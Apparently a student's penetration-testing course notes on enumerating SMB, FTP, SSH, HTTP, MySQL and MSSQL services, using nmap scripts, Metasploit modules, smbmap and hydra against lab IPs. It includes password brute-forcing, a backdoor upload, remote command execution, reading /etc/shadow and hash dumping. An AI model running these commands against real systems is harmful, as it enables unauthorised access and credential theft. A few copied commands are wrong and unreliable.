- [Assessment Methodologies: Enumeration](#assessment-methodologies-enumeration)
  - [Introduction](#introduction)
  - [Servers and services](#servers-and-services)
  - [SMB Lesson](#smb-lesson)
    - [Windows Discover & Mount](#windows-discover--mount)
    - [SMB: NMAP Scripts](#smb-nmap-scripts)
    - [SMB: SMBMap](#smb-smbmap)
    - [SMB: Samba 1](#smb-samba-1)
    - [SMB: Samba 2](#smb-samba-2)
    - [SMB: Samba 3](#smb-samba-3)
    - [SMB Dictionary Attack](#smb-dictionary-attack)
  - [FTP Lesson](#ftp-lesson)
    - [FTP](#ftp)
    - [FTP Anonymous Login](#ftp-anonymous-login)
  - [SSH Lesson](#ssh-lesson)
    - [SSH](#ssh)
    - [SSH Dictionary Attack](#ssh-dictionary-attack)
  - [HTTP Lesson](#http-lesson)
    - [HTTP IIS (Windows)](#http-iis-windows)
    - [HTTP IIS (Windows) Nmap Scripts](#http-iis-windows-nmap-scripts)
    - [HTTP Apache (Linux)](#http-apache-linux)
      - [robots.txt](#robotstxt)
  - [SQL Lesson](#sql-lesson)
    - [MySQL](#mysql)
    - [MySQL Dictionary Attack](#mysql-dictionary-attack)
    - [MSSQL (Microsoft) Nmap Script](#mssql-microsoft-nmap-script)
    - [MSSQL (Microsoft) Metasploit](#mssql-microsoft-metasploit)

# Assessment Methodologies: Enumeration #

## Introduction 

Topics:
+ Servers and Services 
+ SMB
+ FTP
+ SSH
+ HTTP
+ SQL

Objectives:
+ Will know purpose of service enumeration 
+ Identify common services and protocols 
+ Perform service enumeration on common services and protocols 
+ Uderstand process for enumerating unfamiliar protocols and services 

## Servers and services ##

What is a server?
+ **Based on the computers role, will serve to other computers (users)**
+ Can have varying OS, but will hold information or ability for a user
+ Any computer can be a server
+ To have a service running on a server, a port has to be open

Service 
+ **program on a computer that does a specific function**

Bugs and Features 
+ Can get remote access to the whole system with a bad service on a server

## SMB Lesson ##

### Windows Discover & Mount ###

SMB
+ Windows Implementation of a file share
+ **Server Message Block** 

Notes:
+ Can scan a subnet with nmap using the following:
  + `nmap IP/CIDR` 
  + can speed it up using a `T4` or `T5`
  + Only check open ports with `--open`

Windows machines 
+ Generally have open ports `135, 139, and 445`

Connecting with SMB using file explorer
+ Go to network drive
+ map network drive (right click)
+ do `\\IP`
+ select which folder you want
  + may need credentials 

To remove SMB folder (CLI)
+ `net use * /delete`

To add SMB folder (CLI)
+ `net use z: \\IP\c$ PASSWORD /user:USERNAME`
  + The above example will map the c drive

### SMB: NMAP Scripts ###

Now that we know SMB is running as a service, can use nmap to get more information 

<b>SMB protocols:</b>
  + Can scan protocols with the following 
  + `nmap -p 445 --script smb-protocols IP`

+ Can see that SMBv1 is dangerous, and is associated with Wannacry 

<b>SMB Security Mode:</b>
  + Can scan protocols with the following 
  + `nmap -p 445 --script smb-security-mode IP`

+ Can see more configurations, also shows that it has a guest account 

<b>SMB Enumerate Sessions:</b>
  + Can scan protocols with the following 
  + `nmap -p 445 --script smb-enum-sessions IP`

+ Can see who is logged in 

<b>SMB Enumerate Sessions With Arguments:</b>
  + Can scan protocols with the following s
  + `nmap -p 445 --script smb-enum-sessions --script-args smbusername=USERNAME,smbpassword=PASSWORD IP`

+ Can see who is logged, with a time, and logs us in 

<b>SMB Enumerate Shares:</b>
  + Can scan protocols with the following
  + `nmap -p 445 --script smb-enum-shares IP`

+ Can see information about the shares 
  + may see IPC which is a null session, which is an anonymous session

<b>SMB Enumerate Shares After Authenticating:</b>
  + Can scan protocols with the following
  + `nmap -p 445 --script smb-enum-shares --script-args smbusername=USERNAME,smbpassword=PASSWORD IP`

+ Looks different, has more info now that we are authenticated
  + Shows us permissions, READ/WRITE, etc

<b>SMB Enumerate Users:</b>
  + Can scan protocols with the following
  + `nmap -p 445 --script smb-enum-users --script-args smbusername=USERNAME,smbpassword=PASSWORD IP`

+ Can see all the users with descriptions 
  + In this example, you can see that the guest is misconfigured, no password but still a normal user account

<b>SMB Server Statistics :</b>
  + Can scan protocols with the following
  + `nmap -p 445 --script smb-server-stats --script-args smbusername=USERNAME,smbpassword=PASSWORD IP`

+ Can see info about data, logins, jobs, etc

<b>SMB Enumerate Domains:</b>
  + Can scan protocols with the following
  + `nmap -p 445 --script smb-enum-domains --script-args smbusername=USERNAME,smbpassword=PASSWORD IP`

+ Can see more user info, and some password info

<b>SMB Enumerate Groups:</b>
  + Can scan protocols with the following
  + `nmap -p 445 --script smb-enum-groups --script-args smbusername=USERNAME,smbpassword=PASSWORD IP`

+ access dependent on group

<b>SMB Enumerate Services:</b>
  + Can scan protocols with the following
  + `nmap -p 445 --script smb-enum-services --script-args smbusername=USERNAME,smbpassword=PASSWORD IP`

+ Lots of services, that can be very helpful

<b>SMB Enumerate Shares And List:</b>
  + Can scan protocols with the following
  + `nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=USERNAME,smbpassword=PASSWORD IP`

+ Tell us what is in each of the shares 

### SMB: SMBMap ###

<r>SMBMap</r> allows users to enumerate, upload, download, List, etc. For the service SMB

+ See this example: `smbmap -u guest -p "" -d . -H 10.4.26.58`
  + where it is looking with the guest account with no password in the . directory to enumerate directories  
+ Can run a command with `-x`
  + Example: smbmap -H 10.4.26.58 -u administrator -p PASSWORD -x `ipconfig`
    + where the command ipconfig is being run under administrator 
    + Which is RCE (Remote Code Execution)
+ With `-L` you can list out the contents 
  + smbmap -H 10.4.26.58 -u administrator -p PASSWORD -L
+ Can connect to a drive with `-r`
  + Example: `smbmap -H 10.4.26.58 -u administrator -p PASSWORD -r 'c$'`
    + The above example is connecting to the C drive and **shows contents**
+ Can upload a file with `--upload`
  + Example: `smbmap -H 10.4.26.58 -u administrator -p PASSWORD --upload '/root/backdoor' 'c$\backdoor'`
    + where the file is in root and is moved to C
    + can make a file in linux with `touch`
+ Can download a file with `--download`
  + Example: `smbmap -H 10.4.26.58 -u administrator -p PASSWORD --download 'c$\flag.txt'`

### SMB: Samba 1 ###

Overview:
Linux does not support SMB by default, <o>samba</o> allows for SMB type connections between **windows and linux**

Can see if it is running Samba with `-sV` service scan, will also want to check UDP ports with `-sU`
+ can get OS info with `--script smb-os-discovery`

Can jump into <r>msfconsole</r> for more version discovery
+ then find the smb_version using the following:
  + `use auxiliary/scanner/smb/smb_version`
  + Then `show options` to see what we need to add
  + `set rhost IP`
  + then `run` or `explot`

<g>nmblookup</g> can be used for more recon, will use the netbios protocol, will show what it can do
+ Example: `nmblookup -A 192.206.212.3`
+ if you see a `<20>` it is a server that can be connected to 
  + then can use `smbclient`

<g>smbclient</g> can be used to connect to a SMB service 
+ `-L` will list, and `-N` will check for a NULL/No password session 
  + If you see `IPC$` with a null session, may be able to connect
+ Example: `smbclient -L 192.206.212.3 -N`

<g>rpcclient</g> can be used to execute MS-RPC (protocol for a program to request a service from another computer) functions
+ can try to connect to a NULL session with `rpcclient -U "" -N
  + where the user is empty and `-N` means no password 

### SMB: Samba 2 ###

Now that we have used <r>rpcclient</r> to connect to a samba server, can do more recon
+ `srvinfo` will give more information about the server
  + including os version 
+ can `lookupnames` to get SID
+ `enumdomgroups` to see groups

enum4linux
+ A tool for enumerating windows and samba systems
+ Can use `-o` to get OS info
  + Example `enum4linux -o 192.224.150.3`
+ can use `-U` for users 
+ `-S` to enumerate shares
+ `-G` to get groups
+ `-i` to see if it is configured for printing 
+ `-r` can get SIDs for users

Can see if it supports SMB2 in <r>msfconsole</r>
+ `use auxiliary/scanner/smb/smb2`

### SMB: Samba 3 ###

Can enumerate shares in <r>msfconsole</r>
+ `use auxiliary/scanner/smb/smb_enumshares`

Can connect with `smbclient //IP/Public -N`
+ In the above example it connected to Public with no password
+ can use `get` on a file to return it to our directory 

### SMB Dictionary Attack ###

Can use a wordlists to attack credentials with <r>msfconsole</r>
+ `use auxiliary/scanner/smb/smb_login` 
+ Will test a range of logins and report successful logins 
+ `set rhosts IP`
+ `set pass_file /usr/share/wordlist/metasploit/unix_passwords.txt`
+ `set smbuser USER`

Can also do the same with <pu>hydra</pu>
+ `hydra -l admin -P /usr/share/wordlists/rockyou.txt IP smb`

Can now login with smbmap 
+ `smbmap -H IP -u admin -p password1`
  + then can use smbclient with the credentials we got to `-L` shares and see if they are available  

Now you can login with:
+ `smbclient //IP/admin -U admin`
+ will have to type in password 
+ can now download files 

Note:
+ can use `tar -xf FILE` to remove zip and tar

<b>Pipes</b>
+ services talk to each other through pipes
  + named pipes are known pipes
+ Once we are into SMB, we may be able to get into other services through those pipes if we know the name 
+ Can use <r>msfconsole</r>:
  + `use auxiliary/scanner/smb/pipe_auditor`
  + `set smbuser USER`
  + `set smbpass PASSWORD`
  + `set rhosts IP`
+ can now see all available pipes

## FTP Lesson ##

### FTP ###

File Transfer Protocol 
+ Access files remotely from a server

Can connect via `ftp IP`
+ Can click enter for credentials to see if anonymous sessions are allowed 
+ can attack it with <r>hydra</r> by specifying `ftp`
  + Example: `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.94.236.3 ftp`
+ Once logged in can use `get` to retrieve files, and `bye` to leave

Command: <pu>echo</pu>
+ A usefull command line tool to print to terminal with options like `-e` to add to the string
  + `echo -e "Geeks \nfor \nGeeks"` will print with new lines
  + can also use `echo *` to get a list of files in that directory 
+ Pair it with `>` to put a string in a file 
  + Example: `echo "sysadmin" > users`

Can also <o>nmap bruteforce</o> instead of <r>hydra</r>
+ using `--script ftp-brute`
  + Example: `nmap IP --script ftp-brute --script-args userdb=/root/users -p 21`

### FTP Anonymous Login ###

Default configs can be taken advantage of, easy low hanging fruit
+ can use `--script ftp-anon` to check if anon login is allowed, and see what access anon has
  + Example: `nmap 192.168.115.3 -p 21 --script ftp-anon`
+ Now can get in as user: `anonymous` and clicking enter when it asks for the password

## SSH Lesson ##

### SSH ###

Use for remote secure shell for administration, encrypted
+ can connect to some versions with `ssh root@IP`
  + Where the above example is with root
  + Can sometimes get a banner without a password
  + Will usually have three passwords chances

can also use <g>netcat</g> or `nc`
+ netcat is a CLI tool to connect to any port
+ good for collecting ***banners***

can ***enumerate*** ssh 
+ `--script ssh2-enum-algos` can be used to enumerate the algorithms, which can be used to create the key 
  + Example: `nmap 192.66.2.3 -p 22 --script ssh2-enum-algos`
+ to get the RSA key (which is used for encryption) can use `--script ssh-hostkey`
  + Example: `nmap 192.66.2.3 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full`
+ Check for weak passwords and authorization methods with `--script ssh-auth-methods`
  + Example: `nmap 192.66.2.3 -p 22 --script ssh-auth-methods --script-args="ssh.user=student"`
    + will say if it needs a key or password, of there is no authorization needed

### SSH Dictionary Attack ###

Can use <r>hydra</r> to attack SSH users by specifying `ssh`
+ Example: `hydra -l student -P /usr/share/wordlists/rockyou.txt 192.198.157.3 ssh`
  + In the above account, we are attacking user=student

Can also <o>nmap bruteforce</o> instead of <r>hydra</r>
+ using `--script ssh-brute`
  + Example: `nmap IP --script ssh-brute --script-args userdb=/root/users -p 22`

Or can use <b>mfsconsole</b> instead of <r>hydra</r>
+ using `use auxiliary/scanner/ssh/ssh_login`
  + `set rhosts 192.198.157.3`
  + `set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt`
  + `set STOP_ON_SUCCESS true`
  + `set verbose true`

## HTTP Lesson ##

### HTTP IIS (Windows) ###

HTTP is for hosting websites, a big part of the internet 

<g>whatweb</g>
+ A good tool for getting more information about a server
+ Will test for some vulnerabilities 
+ Example: `whatweb IP`

<g> HTTPie (Linux command: http)</g>
+ more server type info and header information 
+ Microsoft IIS will use the .aspx filetype
+ Example `http IP`

<g>Dirb</g>
+ Will enumerate lots of information 
+ Looks for directories 
+ Example: `dirb http://IP/ CAN_SPECIFY_WORLIST`

<g>browsh</g>
+ Will render the website in the command line 
+ Example: `browsh --startup-url http://IP/`

### HTTP IIS (Windows) Nmap Scripts ###

<o>http-enum</o>
+ nmap script that will also return a select list of common directory enumeration 
+ Example: `nmap 10.4.16.92 -p 80 --script http-enum`

<o>http-header</o>
+ will return more information about the website from its header, including vulnerabilities and protections 
+ Example: `nmap 10.4.16.92 -p 80 --script http-header`

<o>http-methods</o>
+ will return more information about the website from its header, including vulnerabilities and protections 
+ Example: `nmap 10.4.16.92 -p 80 --script http-methods --script-args http-methods.url-path=/webdav/`
  + In the above methods will see available methods (POSTS, GET, etc) for /webdav/

<o>http-webdav</o>
+ will identify webdav installation s 
+ Example: `nmap 10.4.16.92 -p 80 --script http-webdav --script-args http-methods.url-path=/webdav/`

### HTTP Apache (Linux) ###

Similar to windows, but interact differently with that specific OS

<o>-script banner</o>
+ nmap scan to get banner information 
+ Example: `nmap 192.32.62.3 -p 80 -sV -script banner`

<r>msfconcole</r>
+ <g>http_version</g>
  + `use auxiliary/scanner/http/http_version`
    + will need to set rhost
  + Collects server version
+ <g>brute_dirs</g>
  + `use auxiliary/scanner/http/http_version`
  + Use a wordlist to find directories 


<g>curl</g>
+ can use curl to see the html of the page

<g>wget</g>
+ can download a webpage 
+ Example: `wget "http://192.32.62.3/index`

<g>lynx</g>
+ parse out the text so its more readable
+ Example: `lynx http://192.32.62.3/index`

#### robots.txt ####

Website will tell the search engine what not to read in this file 

<r>msfconcole</r>
+ <g>robots_txt</g>
  + `use auxiliary/scanner/http/robots_txt`
  + will show what is allowed and disallowed

## SQL Lesson ##

### MySQL ###

The most common open database that runs on some kind of linux 
+ Very often misconfigured and vulnerable 

Can login using the `mysql` keyword
+ Example: `mysql -h 192.94.79.3 -u root`
  + where root is the most common 
+ can look at the databases with a `show databases;`
+ can dig into each database by using `use DBNAME`
  + in there can see tables with `show tables`
+ can dig into a table with `select * from TABLENAME`
+ can get a file via `select load_file("/etc/shadow");`
  + notice the above is `etc/shadow` which will have info about users and services

<r>msfconcole</r>
+ <g>mysql_writeable_dirs</g>
  + use use auxiliary/scanner/mysql/mysql_writable_dirs`
    + will want to `set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt`
    + and `setg rhost IP` to make a global rhost`
    + can also `set verbose false`
    + `set password ""`
  + Will show what directories can be written to
+ <g>mysql_hashdump</g>
  + use auxiliary/scanner/mysql/mysql_hashdump`
  + Will give a lot of hashes for different users

<o>--script=mysql_empty-password</o>
+ A nmap script to see if there are any empty passwords accounts
+ Example: `nmap IP -p 3306 --script=mysql_empty-password`

<o>--script=mysql-info</o>
+ Gets info like version number, capabilities
+ Example: `nmap IP -p 3306 --script=mysql-info`

<o>--script=mysql-users</o>
+ Gets users 
+ Example: `nmap IP -p 3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"`

<o>--script=mysql-databases</o>
+ See available databases
+ Example: `nmap IP -p 3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"`

<o>--script=mysql-variables</o>
+ See how to interact with it, most usefully is data directory to see where the variables are being stored `datadir:`
+ Example: `nmap IP -p 3306 --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"`

<o>--script=mysql-audit</o>
+ audit the setup
+ Example: `nmap IP -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nselib/data/mysql-cis.audit"`

<o>--script=mysql-dump_hashes</o>
+ dump hashes
+ Example: `nmap IP -p 3306 --script=mysql-dump_hashes --script-args="username='root',password=''"`

<o>--script=mysql-query</o>
+ make a query
+ Example: `nmap IP -p 3306 --script=mysql-dump_hashes --script-args="query='select count(*) from books.authors;',username='root',password=''"`

### MySQL Dictionary Attack ###

<r>msfconcole</r>
+ <g>mysql_login</g>
  + `use scanner/mysql/mysql_login`
    + `set rhosts IP`
    + `set pass_file /usr/share/metasploit-framwork/data/wordlists/unix_passwords.txt`
    + `set stop_on_success true`
    + `set verbose false`
    + `set username root`

<pu>hydra</pu>
+ example: `hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt IP mysql`

### MSSQL (Microsoft) Nmap Script ###

<o>--script ms-sql-info</o>
+ Will get info like services, patches, name, etc
+ Example: `nmap IP -p 1433 --script ms-sql-info`

<o>--script ms-sql-ntlm-info</o>
+ Will get info names and NetBIOS names
+ Example: `nmap IP -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433`

<o>--script ms-sql-brute</o>
+ Will run a brute force
+ Example: `nmap IP -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,userdb=/root/Desktop/wordlist/100-common_passwords.txt`

<o>--script ms-sql-empty-password</o>
+ Will look for empty passwords
+ Example: `nmap IP -p 1433 --script ms-sql-empty-password`

<o>--script ms-sql-query</o>
+ Can run a query
+ Example: `nmap IP -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" -oN ouput.txt`
  + will do the described query and push it into a text file

<o>--script ms-sql-dump-hashes</o>
+ Will dump hases for users
+ Example: `nmap IP -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria`

<o>--script ms-sql-xp-cmdshell</o>
+ Will be able to run a shell remotely 
+ Example: `nmap IP -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig"`
  + the above will run a ipconfig
  + note on windows, rather then `cat` will use `type`

### MSSQL (Microsoft) Metasploit ###

<r>msfconcole</r>
+ <g>mssql_login</g>
  + will brute force
  + `use auxiliary/scanner/mssql/mssql_login`
    + `set rhosts IP`
    + `set pass_file /usr/share/metasploit-framwork/data/wordlists/unix_passwords.txt`
    + `set verbose false`
    + `set user_file /root/Desktop/wordlist/common_users.txt`
+ <g>mssql_enum</g>
  + lots of database information
  + `use auxiliary/admin/mssql/mssql_enum`
    + `set rhosts IP`
+ <g>mssql_enum_sql_logins</g>
  + can see logins and the user type
  + `use auxiliary/admin/mssql/mssql_enum_sql_logins`
    + `set rhosts IP`
+ <g>mssql_exec</g>
  + can see if can run commands
  + `use auxiliary/admin/mssql/mssql_exec`
    + `set rhosts IP`
+ <g>mssql_enum_domain_accounts</g>
  + can see domain accounts
  + `use auxiliary/admin/mssql/mssql_enum_domain_accounts`
    + `set rhosts IP`

<style>
r { color: Red; font-weight: bold}
o { color: Orange; font-weight: bold }
g { color: LightGreen; font-weight: bold }
b { color: darkCyan; font-weight: bold}
pu { color: purple; font-weight: bold}
</style>